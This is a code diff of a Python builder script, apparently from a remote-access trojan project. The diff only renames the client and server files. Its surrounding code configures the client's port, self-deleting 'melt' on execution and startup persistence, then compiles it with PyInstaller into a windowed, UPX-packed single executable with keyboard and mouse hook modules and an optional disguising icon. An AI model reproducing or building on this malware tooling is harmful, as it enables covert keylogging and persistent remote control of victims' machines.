@@ -15,9 +15,9 @@ except socket.error:
     print("Make sure you are connected to the internet.")
     sys.exit(0)
 
-# check to make sure client.py exists
-if not os.path.isfile("client.py"):
-    print("client.py not found!")
+# check to make sure _client.py exists
+if not os.path.isfile("_client.py"):
+    print("_client.py not found!")
     sys.exit(0)
 
 
@@ -55,12 +55,12 @@ else:
         sys.exit(0)
 
     # check to make sure server exists
-    elif not os.path.isfile("server.py"):
-        print("server.py not found!")
+    elif not os.path.isfile("_server.py"):
+        print("_server.py not found!")
         sys.exit(0)
 
     # open server and put all lines in an array
-    objServerFile = open("server.py", "r")
+    objServerFile = open("_server.py", "r")
     arrFileContents = objServerFile.readlines()
     objServerFile.close()
 
@@ -72,12 +72,12 @@ else:
             break
 
     # write lines to server
-    objServerFile = open("server.py", "w")
+    objServerFile = open("_server.py", "w")
     objServerFile.writelines(arrFileContents)
     objServerFile.close()
 
 
-objClientFile = open("client.py", "r")
+objClientFile = open("_client.py", "r")
 arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
@@ -106,14 +106,14 @@ if strPort != "":
             arrFileContents[intCounter] = "intPort = " + strPort + "\n"
             break
 
-objClientFile = open("client.py", "w")
+objClientFile = open("_client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
 
 strMeltChoice = input("\n" + "Melt file on execution to tmp folder? y/n: ")
 
-objClientFile = open("client.py", "r")
+objClientFile = open("_client.py", "r")
 arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
@@ -128,14 +128,14 @@ else:
             arrFileContents[intCounter] = "blnMeltFile = False" + "\n"
             break
 
-objClientFile = open("client.py", "w")
+objClientFile = open("_client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
 
 strAddToStartup = input("\n" + "Add program to startup on launch? y/n: ")
 
-objClientFile = open("client.py", "r")
+objClientFile = open("_client.py", "r")
 arrFileContents = objClientFile.readlines()
 objClientFile.close()
 
@@ -150,7 +150,7 @@ else:
             arrFileContents[intCounter] = "blnAddToStartup = False" + "\n"
             break
 
-objClientFile = open("client.py", "w")
+objClientFile = open("_client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
@@ -174,7 +174,7 @@ strIconChoice = strIconChoice.replace("\"", "")
 
 # if the user did not choose an icon build the client using pyinstaller
 if strIconChoice == "":
-    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+    os.system(python_path + "/Scripts/pyinstaller\" _client.py " + strUPX + " --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed")
 # check to make sure the icon exists and that it is a .ico file
@@ -186,6 +186,6 @@ elif not strIconChoice.endswith(".ico"):
     sys.exit(0)
 else:
     # build the client with an icon
-    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+    os.system(python_path + "/Scripts/pyinstaller\" _client.py " + strUPX + " --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed --icon=\"" + strIconChoice + "\"")
